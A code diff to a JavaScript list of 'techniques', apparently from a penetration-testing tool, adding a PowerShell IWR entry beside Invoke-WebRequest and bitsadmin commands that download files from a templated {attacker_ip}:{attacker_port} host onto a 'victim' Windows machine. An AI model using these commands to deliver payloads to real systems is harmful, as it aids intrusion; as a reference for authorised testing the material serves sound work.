@@ -43,7 +43,7 @@ const techniques = [
     {
       id: 4,
       fileTo: "victim", 
-      name: "PowerShell File Transfer",
+      name: "PowerShell File Transfer 1",
       platforms: ["Windows"],
       commands: [
         { machine: "victim", command: "Invoke-WebRequest -Uri http://{attacker_ip}:{attacker_port}/{filename} -OutFile {filename}" }
@@ -93,6 +93,15 @@ const techniques = [
       platforms: ["Windows"],
       commands: [
         { machine: "victim", command: "bitsadmin /Transfer myJob http://{attacker_ip}:{attacker_port}/{filename} {filename}" }
+      ]
+    },
+    {
+      id: 10,
+      fileTo: "victim", 
+      name: "PowerShell File Transfer 2",
+      platforms: ["Windows"],
+      commands: [
+        { machine: "victim", command: "IWR http://{attacker_ip}:{attacker_port}/{filename} -OutFile {filename}" }
       ]
     }
   ];
